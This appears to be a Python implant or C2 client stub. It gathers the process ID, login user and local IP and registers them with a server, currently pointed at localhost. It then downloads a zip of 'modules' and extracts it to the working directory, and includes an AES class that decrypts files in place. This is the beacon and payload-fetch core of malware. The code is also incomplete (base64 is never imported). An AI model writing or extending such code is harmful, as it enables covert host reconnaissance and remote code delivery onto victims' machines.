import os
import socket
import json
import requests
import uuid
import zipfile
from io import BytesIO
import shutil

# ------------Encr------------------
from Crypto.Cipher import AES

class Encryptor:
    def __init__(self, key):
        self.__key__ = key

    def __decrypt(self, enc):
        unpad = lambda s: s[:-ord(s[-1:])]

        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.__key__, AES.MODE_CFB, iv)
        return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('ascii'))
    
    def decrypt_str(self, data):
        return self.__decrypt(data)

    def decrypt(self, fn):
        with open(fn, "r") as f:
            data = f.read()
        with open(fn, "w", encoding="utf-8") as f:
            data = self.__decrypt(data)
            f.write(data)

# ------------------END---------------

def get_system_info():
    pid = os.getpid()
    user = os.getlogin()
    local_ip = socket.gethostbyname(socket.gethostname())
    system_info = {
        'pid': pid,
        'user': user,
        'local_ip': local_ip
    }
    return system_info

def send_info_to_server(info, uuid, url):
    json_data = json.dumps(info)
    response = requests.post(f"{url}/register/{uuid}", json=info)
    return response
    

def get_modules(url, uuid):
    q = requests.get(url + '/' + uuid)
    z = zipfile.ZipFile(BytesIO(q.content))
    z.extractall("./test")
    _ = os.listdir("test")[0]
    shutil.move(f"test/{_}", "./")
    os.rmdir("test")
    return _

if __name__ == "__main__":
    system_info = get_system_info()
    server_url = 'http://localhost:8080'
    d = str(uuid.uuid4())
    response = send_info_to_server(system_info, d, server_url)
    response = get_modules(server_url + '/tasks', d)
    

